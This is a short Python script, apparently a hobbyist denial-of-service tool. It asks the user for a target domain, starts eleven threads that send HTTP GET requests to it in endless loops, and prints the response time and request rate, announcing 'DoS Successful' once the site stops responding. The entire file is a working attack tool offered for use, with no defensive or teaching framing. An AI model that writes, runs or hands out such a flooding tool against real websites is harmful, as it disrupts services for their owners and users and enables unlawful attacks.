import requests
import threading
import time
from pyfiglet import figlet_format
from colorama import Fore

f = figlet_format("D D o S", font="slant")  # To create tool name and ask domain name want to DoS
print(Fore.BLUE, f)
print("Give your Domain ==> ")
website = input()
l = []
rl = []


def current_mil_time():                # To calculate current time in millisecond
    return int(time.time() * 1000)


def current_sec_time():                # To calculate current time in seconds
    return int(time.time())


def count_resp_per_sec(time_took):     # To count response per second
    t = current_sec_time()
    l.append({
        "time_took": time_took,
        "time_received": t,
    })
    # print(l)
    for e in l:
        if current_sec_time() - e["time_received"] >= 1:
            l.remove(e)


def count_req_per_sec():               # To count request per second
    t = current_sec_time()
    rl.append({
        "time_received": t,
    })
    # print(rl)

    for e in rl:
        if current_sec_time() - e["time_received"] >= 1:
            rl.remove(e)


message = "DoSing..."


def make_request(name):
    while True:
        count_req_per_sec()
        try:
            s = current_mil_time()
            r = requests.get(website)
            t = current_mil_time() - s
            count_resp_per_sec(t)
        except:
            message = "DoS Successful. Site looks down for now."


if website.startswith("http"):             # To create and start thread to make request
    threads = 10
    while threads >= 0:
        x = threading.Thread(target=make_request, args=(threads,))
        print("Starting thread #{}...".format(threads))
        x.start()
        threads -= 1

    print("Calculating... wait for a while for it to adjust...")
    # response_time = 0
    while True:                           # To calculate Average response time
        time.sleep(1)
        response_time = 0
        for e in l:
            response_time = response_time + e['time_took']
        if (len(l)) > 0:
            response_time = response_time / len(l)
        if response_time > 60000:
            message = "DoS Successful. Site looks down for now."
        else:
            message = "DoSing..."
        print("\rAverage response time: {}ms; Requests/sec: {}; Responses/sec: {}; {}".format(round(response_time),
                                                                                              len(rl), len(l), message),
              end="")
else:
    print('Give this format https://www.google.com/')